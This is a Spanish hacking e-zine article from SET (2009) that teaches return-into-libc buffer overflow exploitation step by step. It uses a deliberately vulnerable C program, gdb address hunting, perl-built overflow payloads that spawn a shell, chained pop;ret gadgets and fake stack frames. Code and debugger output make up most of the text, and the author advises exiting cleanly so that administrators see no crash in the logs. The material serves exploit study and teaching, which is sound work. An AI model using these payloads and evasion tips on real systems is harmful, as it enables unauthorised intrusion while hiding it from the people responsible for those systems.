@@ -1,0 +1,823 @@
+-[ 0x05 ]--------------------------------------------------------------------
+-[ Metodos Return Into To Libc ]---------------------------------------------
+-[ by blackngel ]----------------------------------------------------SET-37--
+
+
+          ^^
+      *`* @@ *`*     HACK THE WORLD
+     *   *--*   *    
+          ##         by blackngel <blackngel1@gmail.com>
+          ||                      <black@set-ezine.org>
+         *  *
+        *    *       (C) Copyleft 2009 everybody
+       _*    *_
+
+
+ 1 - Introduccion
+
+ 2 - Un Acercamiento
+
+ 3 - Prueba de Concepto
+
+ 4 - Exploits Avanzados
+
+   4.1 - Encadenar funciones
+
+   4.2 - Falseo de Frames
+
+ 5 - Conclusion
+
+ 6 - Referencias
+
+
+---[ 1 - Introduccion
+
+Si, lo se, ya se que me echais de menos. Ya se que hace mucho tiempo que no
+escribo ningun articulo para este e-zine. Pero podeis estar tranquilos, he
+vuelto, como el turron en navidad.
+
+Si, tambien lo se, mis ironias dejan bastante que desar... asi que vamos
+directos al tema en cuestion, que parece que eso si que se me da algo mejor
+(solo un poco la verdad).
+
+Este articulo bien pudiera ir directo a la seccion del Bazar de SET, ya que
+no sera mas que una mera introduccion a la conocida tecnica de explotacion
+Return Into To Libc que alguna que otra vez puede salvarte la vida.
+
+
+
+---[ 2 - Un Acercamiento
+
+Cuando Ret2Libc puede ser util?
+---                         ---
+
+Facil de responder: Cuando las paginas de memoria de tu sistema, o del sistema
+a explotar, estan marcadas como no ejecutables. En estos casos lograr introducir
+un shellcode en el Stack o incluso en los argumentos del programa, no servira
+de mucho.
+
+Pero gracias a gente inteligente, sigue habiendo obstaculos que todavia son, por
+suerte, facilmente sorteables.
+
+
+Por que Ret2Libc es efectivo?
+---                       ---
+
+La mision de esta tecnica radica en conseguir modificar el valor de retorno EIP
+con la direccion de una funcion del sistema, normalmente "system()". Estas
+funciones se encuentran en una libreria cargada en tiempo de ejecucion con tu
+programa y, efectivamente, su espacio de memoria SI es ejecutable, dado que sino
+no serviria de mucho.
+
+Cuando la funcion vulnerable a BoF retorne, la funcion sera ejecutada y con ella
+el parametro que se le haya proporcionado, que para nuestros intereses sera
+normalmente "/bin/sh" o algo parecido.
+
+
+Hay alguna limitacion?
+---                ---
+
+Claro que si, no todo iba a ser un camino de rosas. Todos sabemos que los
+sistemas o distribuciones mas modernas implementan una tecnica de aleatorizacion
+de direcciones de memoria. Si es tu caso, Ret2Libc no sera aplicable ya que
+la direccion de la llamada a system() estara saltando de un lado a otro a cada
+momento.
+
+No obstante, hay quien dice que en estas situaciones el bruteforcing puede ser
+aplicable. Y teniendo en cuenta que de los 4 bytes que componen una direccion,
+3 de ellos son los que varian, tampoco seria muy descabellado pensar que en
+algun momento se pueda caer fortuitamente sobre la direccion correcta.
+
+Bueno, el bruteforce siempre ha estado ahi, a nuestro lado, eso ya lo sabemos
+todos, no?
+
+
+
+---[ 3 - Prueba de Concepto
+
+Sin mas preambulos, veamos el tipico y aburrido programa vulnerable:
+
+[-----]
+
+#include <stdio.h>
+#include <string.h>
+
+fvuln(char *temp1, char *temp2)
+{
+   char name[512];
+
+   strcpy(name, temp2);
+   printf("Hello, %s %s\n", temp1, name);
+}
+
+int main(int argc, char *argv[])
+{
+   fvuln(argv[1],argv[2]);
+   printf("Bye %s %s\n", argv[1], argv[2]);
+
+   return 0;
+}
+
+[-----]
+
+Facil, un buffer de 512 bytes desbordable. Antes de nada, veamos ahora que
+estructura debe contener la pila para una explotacion exitosa.
+
+La pregunta es, como "system()" toma sus parametros?
+
+Pues bien, cuando una funcion es llamada, el primer valor que se encuentra en
+la pila es la direccion de retorno a donde debe devolver el control una vez
+haya completado su mision. Seguidamente se colocan en la pila los parametros
+en orden ascendente.
+
+Graficamente deberiamos lograr algo asi:
+
+   [AAAAAAAAAA.................AAAAAAAAAAAA] [&system] [ ret ] [ &"/bin/sh" ] 
+   [          BUFFER(512)          ] [ EBP ] [  EIP  ] [    args fvuln()    ]
+
+
+Bien, teniendo esto en cuenta, 2 elementos son extrictamente necesarios:
+
+   1) Obtener la direccion de system()
+   2) Obtener la direccion de la cadena "/bin/sh".
+
+Aqui hay algo importante a destacar, el valor de "ret" no es importante en
+principio, ya que este no sera tomado hasta que la ejecucion de la funcion
+system("/bin/sh") haya finalizado. Pero esto no implica que tengamos que ser
+unos exploiters descuidados...
+
+...ocurre que si dejamos este valor al azar, el programa rompera tras regresar
+de nuestra preciada shell, y este comportamiento no suele ser siempre el
+deseado por varios motivos. Imagina que has descubierto una aplicacion remota
+que es vulnerable y actua como servidor... en esta situacion seria estupendo
+poder explotar el programa y que cuando terminemos nuestra sesion en la shell
+la aplicacion continue su ejecucion, de modo tal que nadie advierta que hemos
+realizado una entrada no autorizada al sistema. 
+
+En nuestro caso, cabe pensar que la solucion optima seria que el programa
+continuase en la direccion de la instruccion:
+
+   printf("Bye %s %s\n", argv[1], argv[2]);
+
+De todos modos, siempre puedes obtener la direccion de otra llamada de sistema
+como "exit()", y lograr asi que el programa finalice limpiamente. Esta eleccion
+es buena, pues evita que un fallo sea registrado en los logs del sistema
+(normalmente un aviso de fallo de segmentacion en /var/log/messages), lo cual
+daria cuenta al administrador de nuestras intenciones.
+
+Nosotros utilizaremos la primera de las opciones, no obstante vamos a sacar
+ambas direcciones, tanto para system() como para exit():
+
+  blackngel@mac:~/pruebas/bo$ gcc-3.3 meet.c -o meet
+  blackngel@mac:~/pruebas/bo$ gdb -q ./meet
+  (gdb) break main
+  Breakpoint 1 at 0x80483e7
+  (gdb) run
+  Starting program: /home/blackngel/pruebas/bo/meet 
+
+  Breakpoint 1, 0x080483e7 in main ()
+
+  (gdb) p system
+  $1 = {<text variable, no debug info>} 0xb7ead990 <system>
+
+  (gdb) p exit
+  $3 = {<text variable, no debug info>} 0xb7ea2fb0 <exit>
+
+Correcto, ahora tenemos que poner una cadena "/bin/sh" en algun lugar de la
+memoria y obtener su direccion. El clasico programa "./getenv" que mostramos
+en otros articulos nos permite hacer lo siguiente:
+
+ blackngel@mac:~/pruebas/bo$ export SHELL2=/bin/sh
+ blackngel@mac:~/pruebas/bo$ ./getenv SHELL2
+ SHELL2 is located at 0xbffff71c
+ blackngel@mac:~/pruebas/bo$ 
+
+Como dijimos, nosotros queremos que el programa continue su ejecucion del modo
+normal, asi que solo nos queda obtener la direccion de la instruccion deseada:
+
+(gdb) disass main
+Dump of assembler code for function main:
+0x080483e1 <main+0>:	push   %ebp
+0x080483e2 <main+1>:	mov    %esp,%ebp
+0x080483e4 <main+3>:	sub    $0x18,%esp
+0x080483e7 <main+6>:	and    $0xfffffff0,%esp
+..........
+..........
+0x08048408 <main+39>:	call   0x80483a4 <fvuln>
+0x0804840d <main+44>:	mov    0xc(%ebp),%eax
+0x08048410 <main+47>:	add    $0x8,%eax
+0x08048413 <main+50>:	mov    (%eax),%eax
+0x08048415 <main+52>:	mov    %eax,0x8(%esp)
+0x08048419 <main+56>:	mov    0xc(%ebp),%eax
+0x0804841c <main+59>:	add    $0x4,%eax
+0x0804841f <main+62>:	mov    (%eax),%eax
+0x08048421 <main+64>:	mov    %eax,0x4(%esp)
+0x08048425 <main+68>:	movl   $0x8048512,(%esp)
+0x0804842c <main+75>:	call   0x80482ec <printf@plt>
+0x08048431 <main+80>:	leave  
+0x08048432 <main+81>:	ret    
+End of assembler dump.
+(gdb) 
+
+Entonces el programa deberia retornar justo en esta lugar:
+
+   0x0804840d <main+44>:	mov    0xc(%ebp),%eax
+
+Ya tenemos todos los ingredientes necesarios:
+
+   system() -> 0xb7ead990
+     ret    -> 0x0804840d
+   /bin/sh  -> 0xbffff71c
+
+Vamos a ver si el pastel bomba produce el efecto: 
+
+blackngel@mac:~/pruebas/bo$ gdb -q ./meet
+(gdb) run A `perl -e 'print "A"x524 . "\x90\xd9\xea\xb7" . "\x0d\x84\x04\x08"
+                                                         . "\x1c\xf7\xff\xbf";'`
+Starting program: /home/blackngel/pruebas/bo/meet A `perl -e 'print "A"x524 .
+                 "\x90\xd9\xea\xb7" . "\x0d\x84\x04\x08" . "\x1c\xf7\xff\xbf";'`
+Hello,  E
+            AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0804840d in main ()
+
+Vaya chasco! Bueno pero tranquilidad, aqui hay dos cosas importantes, la mas
+clara es que nuestra shell no se ha ejecutado, y la segunda es que el programa
+rompe en la direccion de retorno que habiamos elegido.
+
+El primero de los problemas es facil de resolver, seguramente el programa
+"./getenv" no nos haya proporcionado la direccion exacta de la variable de
+entorno. Consultando a GDB podemos sacar el punto exacto en la memoria:
+
+(gdb) x/s 0xbffff71c
+0xbffff71c:	 "T_INFO=/tmp/seahorse-TKRlwr/S.gpg-agent:6371:1"
+(gdb) x/s 0xbffff710
+0xbffff710:	 "/sh"
+(gdb) x/s 0xbffff70c
+0xbffff70c:	 "/bin/sh"
+
+Entonces nuestra cadena estaba un poco mas atras de lo que parecia. Ahora ya
+tenemos la direccion correcta.
+
+El segundo problema es un poco mas complicado, pero no demasiado para nuestros
+propositos. Fijate que nuestra direccion de retorno hace uso de EBP (hay otra
+mas adelante que tambien lo hace):
+
+     0x0804840d <main+44>:	mov    0xc(%ebp),%eax
+     ..........
+     0x08048419 <main+56>:	mov    0xc(%ebp),%eax
+
+Cuando nosotros desbordamos la pila, tambien estamos modificando el registro
+EBP que se encuentra justo antes de EIP. Al llenarlo con caracteres "A" esta
+direccion apunta a 0x41414141, y los accesos de memoria que utilicen ese
+registro produciran una violacion de segmento.
+
+Cual es la solucion? Pues antes de pasar a la drastica medida de utilizar la
+direccion de exit(), podemos obtener la direccion de EBP en una ejecucion normal
+y utilizarlo de modo que este registro quede inalterado:
+
+(gdb) disass fvuln 
+Dump of assembler code for function fvuln:
+0x080483a4 <fvuln+0>:	push   %ebp
+0x080483a5 <fvuln+1>:	mov    %esp,%ebp
+0x080483a7 <fvuln+3>:	sub    $0x218,%esp
+0x080483ad <fvuln+9>:	mov    0xc(%ebp),%eax
+..........
+0x080483bd <fvuln+25>:	call   0x80482dc <strcpy@plt>
+..........
+0x080483da <fvuln+54>:	call   0x80482ec <printf@plt>
+0x080483df <fvuln+59>:	leave  
+0x080483e0 <fvuln+60>:	ret    
+End of assembler dump.
+
+(gdb) break *fvuln+9
+Breakpoint 1 at 0x80483ad
+(gdb) run hack blackngel
+Starting program: /home/blackngel/pruebas/bo/meet hack blackngel
+
+Breakpoint 1, 0x080483ad in fvuln ()
+(gdb) x/4x $ebp
+0xbffff4e8:	0xbffff508	0x0804840d	0xbffff705	0xbffff70a
+                  [ EBP ]         [ EIP ]
+
+Probemos nuevamente conservando este valor:
+
+(gdb) run A `perl -e 'print "A"x520 . "\x08\xf5\xff\xbf" . "\x90\xd9\xea\xb7" .
+                                      "\x1c\x84\x04\x08" . "\x0c\xf7\xff\xbf";'`
+Star program: /home/blackngel/pruebas/bo/meet A `perl -e 'print "A"x520 . "\x08
+\xf5\xff\xbf" . "\x90\xd9\xea\xb7" . "\x1c\x84\x04\x08" . "\x0c\xf7\xff\xbf";'`
+
+Hello,    
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA        
+
+sh-3.2$ id
+uid=1000(blackngel) gid=1000(blackngel) grupos=4(adm),20(dialout),24(cdrom),
+25(floppy),29(audio),30(dip),33(www-data),44(video),46(plugdev),104(scanner),
+108(lpadmin),110(admin),115(netdev),117(powerdev),1000(blackngel),1001(compiler)
+sh-3.2$ exit
+exit
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0804841f in main ()
+
+Bingo! Hemos logrado nuestra deseada Shell. Por desgracia, el programa ha vuelto
+a romper, aunque es de notar como no lo ha hecho en el mismo punto que antes, ya
+que ahora EBP tiene su valor original. La funcion fallida es esta:
+
+   0x0804841f <main+62>:	mov    (%eax),%eax
+
+Lo que ocurre es que cuando "/bin/sh" es ejecutado, el valor de los registros
+de proposito general son alterados para su uso especifico, como estos no son
+restaurados, el programa rompe.
+
+Que esto haya ocurrido en nuestro programa vulnerable de ejemplo, no quiere
+decir que sea asi en todos. Ademas, siempre puedes buscar otros puntos donde
+estos registros no intervengan, o donde haya intrucciones xor que los limpien
+sin mas.
+
+Mi objetivo era mostrarte como trabaja la realidad, sin enganos y con todas sus
+problematicas. Uno esta aburrido de leer articulos y tecnicas de explotacion
+donde todo se consigue a la primera.
+
+Ya para terminar, y para evitar, como dijimos, que alguien pueda tomar nota de
+nuestras acciones en los logs, probemos a salir limpiamente con exit().
+
+Como curiosidad, cabe decir que una vez exit() toma el control, supuestamente
+el valor de la direccion de "/bin/sh" pasa a ser su direccion de retorno, ya
+que es el siguiente valor en la pila y el siguiente valor sera su parametro,
+que justamente deberia ser "0", ya que es el caracter de final de cadena del
+parametro pasado a la funcion. El valor de retorno seria un problema, pero
+todos sabemos ya que la funcion exit() no retorna nunca.
+
+Veamos:
+
+(gdb) run A `perl -e 'print "A"x520 . "\x08\xf5\xff\xbf" . "\x90\xd9\xea\xb7" .
+"\xb0\x2f\xea\xb7" . "\x0c\xf7\xff\xbf";'`
+
+Start program: /home/blackngel/pruebas/bo/meet A `perl -e 'print "A"x520 . "\x08
+\xf5\xff\xbf" . "\x90\xd9\xea\xb7" . "\xb0\x2f\xea\xb7" . "\x0c\xf7\xff\xbf";'`
+Hello, U  WVS ?    9 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA     ?/  
+
+sh-3.2$ exit
+exit
+
+Program exited normally.
+(gdb) 
+
+Que mas se puede pedir. Una salida perfecta };-D
+
+Puedes obtener una referencia basica sobre esta tecnica en el articulo:
+
+
+
+
+---[ 4 - Exploits Avanzados
+
+Mas de uno se habra quedado con ganas de conocer un poco mas acerca del tema.
+Pero tranquilos, no todo esta acabado...Realizaremos aqui un breve estudio de
+un par de interesantes tecnicas.
+
+En el paper de Phrack "The advanced return-into-lib(c) exploits" [2], Nergal
+nos brindo una gran cantidad de conocimiento que nos puede permitir un control
+mas avanzado de la pila.
+
+
+
+---[ 4.1 - Encadenar Funciones
+
+Una de sus primeras tecnicas se llamaba "esp lifting", y su nucleo activo se
+basa en jugar con el desplazamiento de este registro para conseguir un control
+completo de la pila.
+
+Nergal apunto una primera opcion que se basaba en establecer el valor de "ret"
+a un lugar de la memoria donde pudiesemos encontrar un codigo como este:
+
+        addl    $LOCAL_VARS_SIZE,%esp
+        ret
+
+Esto es habitual en programas compilados con la opcion "-fomit-frame-ponter".
+
+Ya que este articulo no es una traduccion de su paper, te remito al mismo para
+que hagas un breve repaso de la tecnica descrita. Nosotros nos centraremos aqui
+en la segunda opcion propuesta en "esp lifting", que utiliza otra porcion de
+codigo. En particular esto:
+
+        popl registro
+        ret
+
+Todos sabemos ya que las funciones "pop" y "push", incrementan o decrementan
+respectivamente en 4 bytes el valor de %esp. Entonces podemos crear un buffer
+como el siguiente:
+
+   [AAAAA(512)] [&system] [ &(popl;ret;) ] [ &"/bin/sh" ] [ &func2() ]
+
+Por pasos lo que ocurre es lo siguiente:
+
+ 1) Se ejecuta system("/bin/sh"). En este momento ESP apunta a [&(popl;ret;)]
+
+ 2) Cuando system() termina, se ejecuta (popl;ret;). En este momento ESP apunta
+    a [ &"/bin/sh" ] que se se supone que es la siguiente direccion de retorno.
+    Pero la funcion "popl" hara que ESP se incremente en 4 bytes, y pase
+    directamente a apuntar a [ &func2() ].
+
+ 3) Se ejecuta func2();
+
+Piensa que podrias seguir encadenando mas (popl;ret;) y ejecutar tantas
+funciones como quieras:
+
+  [f1()][&(popl;ret;)][arg1][f2()][&(popl;ret;)][arg1][f3][&(popl;ret;)][arg1]
+
+Como puedes ver, la limitacion es que solo se pueden utilizar funciones que
+requieran 1 argumento. Nergal nos advirtio que para conseguir mas argumentos
+en cada funcion podiamos buscar un codigo como este:
+
+        popl reg
+        popl reg
+        ret
+
+Para hacer una breve prueba, veamos como podemos encadenar dos llamadas a
+system("/bin/sh").
+
+Para obtener nuestras instrucciones "pop; ret;", podemos utilizar objdump:
+
+blackngel@mac:~/pruebas/bo$ objdump -d ./meet
+
+./meet:     file format elf32-i386
+
+Disassembly of section .init:
+........
+........
+
+08048370 <frame_dummy>:
+........
+........
+ 80483a2:	5d                   	pop    %ebp
+ 80483a3:	c3                   	ret  
+
+........
+........
+
+Nuestro buffer de ataque tiene que ser algo como esto:
+
+[AA(512)] [&system] [ &(popl;ret;) ] [ &"sh" ] [ &func2() ] [ &exit ] [ &"sh" ]
+
+(gdb) run A `perl -e 'print "A"x524 . "\x90\xd9\xea\xb7" . "\xa2\x83\x04\x08" .
+                 "\x0c\xf7\xff\xbf" . "\x90\xd9\xea\xb7" . "\xb0\x2f\xea\xb7" .
+                                                           "\x0c\xf7\xff\xbf";'`
+[AAAAAA............AAAAAA]
+[AAAAAA............AAAAAA]
+
+sh-3.2$ exit
+exit
+sh-3.2$ exit
+exit
+
+Program exited normally.
+(gdb) 
+
+Si necesitaras mas argumentos, la salida de objdump te ofrecia algo como esto:
+
+08048450 <__libc_csu_init>:
+ ........
+ 80484a5:	5b                   	pop    %ebx
+ 80484a6:	5e                   	pop    %esi
+ 80484a7:	5f                   	pop    %edi
+ 80484a8:	5d                   	pop    %ebp
+ 80484a9:	c3                   	ret    
+
+080484aa <__i686.get_pc_thunk.bx>:
+ ........
+
+Si direccionaras un ret a 0x080484a5 podrias permitirte utilizar una funcion
+con 4 parametros. Piensa que puedes utilizar en tu cadena distintos juegos de
+pop y ret para ajustar el numero de argumentos de la funcion a utilizar en
+cuestion. Es mas facil de hacer que de explicar...
+
+
+
+---[ 4.2 - Falseo de Frames
+
+La tecnica de falseo de frames (o marcos de pila) descrita por Nergal, es de
+lo mas inteligente que he visto en mucho tiempo. Por desgracia, su descripcion
+teorico/practica no fue lo suficientemente extensa como para que un hacker de
+bajo nivel puede comprenderla en esencia.
+
+Nosotros tenemos por objetivo describir este tecnica paso a paso, aun a riesgo
+de caer en una teoria pesada. Tambien mostrare una prueba de concepto que
+demuestre la fiabilidad del metodo.
+
+Para comprender totalmente lo que viene a continuacion, seria recomendable una
+lectura previa al articulo "Jugando con Frame Pointer" que he escrito y el cual
+ha sido el plato de apertura de este numero de SET.
+
+La finalidad de la tecnica es conseguir un control total de ESP, y para ello lo
+hace atraves de la unica manipulacion del registro EBP. En un primer paso, el
+buffer deberia tener esta forma:
+
+         [   RELLENO   ] [ FALSO EBP ] [&leave;ret;] 
+         [ BUFFER (512)] [    EBP    ] [    EIP    ]
+         |
+         0xbffff710
+
+Imaginate que la direccion que hemos apuntado como principio del buffer fuera
+realmente esa...
+
+Ahora fijate en las ultimas instrucciones de la funcion "fvuln()":
+
+0x080483da <fvuln+54>:	call   0x80482ec <printf@plt>
+0x080483df <fvuln+59>:	leave  
+0x080483e0 <fvuln+60>:	ret 
+
+Como ya mencione en "Jugando con Frame Pointer", la instruccion "leave" equivale
+a: movl %ebp,%esp; popl %ebp;
+
+Por lo tanto, cuando fvuln() termina, la instruccion "popl" colocara nuestro
+FALSO EBP en el registro %ebp. Seguidamente, como en un BoF normal, se ejecutara
+lo que este en EIP, que en este caso son otras dos intrucciones "leave; ret;"
+
+Pero en este caso la cosa ya cambia, porque la instruccion "movl %ebp,%esp" nos
+dara el control de %esp, ya que recibira nuestro FALSO EBP. Por ultimo debemos
+tener una cosa en cuenta, y es que la ultima instruccion pop de ese leave,
+incrementara %esp en 4 bytes.
+
+Con todo esto, piensa que ocurre si hacemos que nuestro FALSO EBP sea, por poner
+un ejemplo, 0xbffff710. Cuando fvuln() termina, sera puesto en %ebp, y cuando
+nuestro segundo &leave;ret; sea ejecutado, sera pasado a %esp y este sera
+incrementado en 4 bytes, quedando 0xbffff714. Luego se tomara la direccion que
+alli se encuentre y se ejecutara.
+
+Antas de continuar con el encadenamiento de falsos frames, para no perder el
+hilo, vamos a comprobar si lo anterior es cierto. Compondremos un buffer tal
+que asi:
+
+                                                  [  EBP  ][   EIP    ]
+     [AAAAsystem()][&leave;ret;][&/bin/sh][AAA...][&buffer][&leave;ret]
+     ^____^___________________________________________|         |
+          |_____________________________________________________|
+
+El primer "leave;ret" que veis no es importante de momento...
+
+El unico dato que desconocemos en principio, es la direccion de inicio de
+nuestro buffer, pero lo sacaremos en directo. Con respecto al "leave;ret",
+utilizaremos el mismo que termina fvuln(): 0x080483df. Para no alargar el
+tema, he puesto un breakpoint justos despues del strcpy(), y otro justo antes
+del "ret" en fvuln(). Vamos alla:
+
+(gdb) x/s 0xbffff70b
+0xbffff70b:	 "/bin/sh" // Obtenemos direccion de la cadena
+
+                                          //system()          // &leave;ret;
+(gdb) run black `perl -e 'print "AAAA"."\x90\xd9\xea\xb7"."\xdf\x83\x04\x08".
+       "\x0b\xf7\xff\xbf" . "A"x504 . "\xaa\xf0\xff\xbf"."\xdf\x83\x04\x08"'`
+            // "/bin/sh"      // PAD       // &buffer         // &leave;ret;
+
+Breakpoint 1, 0x080483c2 in greeting () // Para despues del strcpy()
+(gdb) i r $esp
+esp            0xbffff0b0	0xbffff0b0
+(gdb) x/8x $esp
+0xbffff0b0:	0xbffff0c0	0xbffff4f3	0x00000000	0x00000000
+0xbffff0c0:	0x41414141	0xb7ead990	0x080483df	0xbffff70b
+    |_principio del buffer
+
+// Reiniciamos                            //system()          // &leave;ret;
+(gdb) run black `perl -e 'print "AAAA"."\x90\xd9\xea\xb7"."\xdf\x83\x04\x08".
+        "\x0b\xf7\xff\xbf" . "A"x504 . "\xc0\xf0\xff\xbf"."\xdf\x83\x04\x08"'``
+            // "/bin/sh"      // PAD       // &buffer         // &leave;ret;
+
+Breakpoint 1, 0x080483c2 in greeting () / Para despues del strcpy()
+(gdb) i r $ebp $esp
+ebp            0xbffff2c8	0xbffff2c8 // Valor normal
+esp            0xbffff0b0	0xbffff0b0 // Valor normal
+(gdb) c
+Continuing.
+Hello, [Basura AAAAAAAAA.........AAAAA]
+Breakpoint 2, 0x080483e0 in greeting () // Para antes del "ret"
+
+(gdb) i r $ebp $esp
+ebp            0xbffff0c0	0xbffff0c0  // EBP alterado con &buffer
+esp            0xbffff2cc	0xbffff2cc
+(gdb) c
+Continuing.
+
+// Ahora se ejecutara el "leave;ret" que pusimos en EIP, y por lo tanto el
+// breakpoint volvera a detenerse antes del "ret".
+Breakpoint 2, 0x080483e0 in greeting ()
+(gdb) i r $ebp $esp
+ebp            0x41414141	0x41414141
+esp            0xbffff0c4	0xbffff0c4 // ESP = EBP + 4
+(gdb) c
+Continuing.
+sh-3.2$ exit
+exit
+
+Program received signal SIGSEGV, Segmentation fault.
+0x080483df in greeting ()
+(gdb)
+
+Genial! El metodo funciona! Pero Nergal queria explicarnos que podemos seguir
+encadenando frames falsos. El truco esta en establecer las primeras 4 A'es de
+nuestro buffer, a un siguiente EBP FALSO.
+
+Teniamos al final de nuestra prueba, que ESP era igual a 0xbffff0c4. Cuando
+system() es ejecutada, su prologo de funcion hace un "push %ebp", lo que
+decrementa ESP en 4 bytes. Por lo tanto volvemos a tener 0xbffff0c0, justo el
+principio de nuestro buffer.
+
+Cuando system() termina, su instruccion "leave" coge el valor que se encuentra
+en ESP y lo mete en EBP. En la prueba anterior, el programa termino con un
+fallo de segmentacion, y ello es debido por el valor que tomo ebp:
+
+     (gdb) i r $ebp
+     ebp         0x41414141	0x41414141
+
+Despues entra en accion el "leave;ret" que colocamos seguido de system() y que
+dijimos que en principio no era importante. Pero ahora si lo es, porque la
+instruccion "movl %ebp,%esp" volvera a darnos el control de %esp, y por tanto
+podemos crear otro frame falso.
+
+Esta tecnica tiene una ventaja enorme, y es que como podemos colocar cada frame
+en posiciones arbitrarias de la memoria, las funciones que ejecutemos en cada
+uno de ellos puede tener el numero de argumentos que nos apetezca.
+
+Para demostrar que todo esto es cierto, vamos a crear 4 frames a lo largo de
+nuestro buffer, y ademas, haremos que los frames falsos no sean consecutivos,
+de modo que puedas comprender que incluso podrias ponerlos en muchos otros
+lugares de la memoria, como las variables de entorno o los argumentos.
+
+Llamaremos siempre a la funcion system() pero primero lo haremos con el comando
+"/bin/id", luego con un "/bin/sh", y para terminar otro "/bin/id". El ultimo
+frame desencadenara una llamada a exit() para terminar limpiamente.
+
+blackngel@mac:~/pruebas/bo$ export SHELL2="/bin/sh"
+blackngel@mac:~/pruebas/bo$ export ID="/usr/bin/id"
+blackngel@mac:~/pruebas/bo$ gdb -q ./meet
+(gdb) break main
+Breakpoint 1 at 0x80483e7
+(gdb) run black hack
+Breakpoint 1, 0x080483e7 in main ()
+(gdb) x/s 0xbffff6eb
+0xbffff6eb:	 "/bin/sh"
+(gdb) x/s 0xbffffe3c
+0xbffffe3c:	 "/usr/bin/id"
+
+Ya tenemos unas bonitas direcciones, montemos ahora un paquete bomba:
+
+(gdb) run black `perl -e 'print "\xe0\xf0\xff\xbf" . "\x90\xd9\xea\xb7" .
+                                "\xdf\x83\x04\x08" . "\x3c\xfe\xff\xbf" ."A"x64.
+                                "\x04\xf1\xff\xbf" . "\x90\xd9\xea\xb7" .
+                                "\xdf\x83\x04\x08" . "\xeb\xf6\xff\xbf" ."B"x20.
+                                "\x34\xf1\xff\xbf" . "\x90\xd9\xea\xb7" .
+                                "\xdf\x83\x04\x08" . "\x3c\xfe\xff\xbf" ."C"x32.
+                                "ENDF" . "\xb0\x2f\xea\xb7" . "A"x348 .
+                                "\x90\xf0\xff\xbf" . "\xdf\x83\x04\x08"'`
+
+// PARAMOS DESPUES DE STRCPY() PARA EXAMINAR LA MEMORIA
+Breakpoint 2, 0x080483c2 in fvuln ()
+(gdb) x/4x $ebp  // EBP0       //&leave;ret;
+0xbffff298:	0xbffff090	0x080483df	0xbffff400	0xbffff4d3
+
+(gdb) x/50x $esp
+0xbffff080:	0xbffff090	0xbffff4d3	0x00000000	0x00000000
+// 1er FRAME       EBP1          &system       &leave;ret;   &"/usr/bin/id"
+0xbffff090:	0xbffff0e0	0xb7ead990	0x080483df	0xbffffe3c
+// RELLENO ALEATORIO
+0xbffff0a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff0b0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff0c0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff0d0:	0x41414141	0x41414141	0x41414141	0x41414141
+
+// 2do FRAME       EBP2         &system       &leave;ret;      &"/bin/sh"
+0xbffff0e0:	0xbffff104	0xb7ead990	0x080483df	0xbffff6eb
+// RELLENO ALEATORIO
+0xbffff0f0:	0x42424242	0x42424242	0x42424242	0x42424242
+
+// 3er FRAME                       EBP3          &system        &leave;ret;
+0xbffff100:	0x42424242	0xbffff134	0xb7ead990	0x080483df
+              &"/usr/bin/id
+0xbffff110:	0xbffffe3c	0x43434343	0x43434343	0x43434343
+// RELLENO ALEATORIO
+0xbffff120:	0x43434343	0x43434343	0x43434343	0x43434343
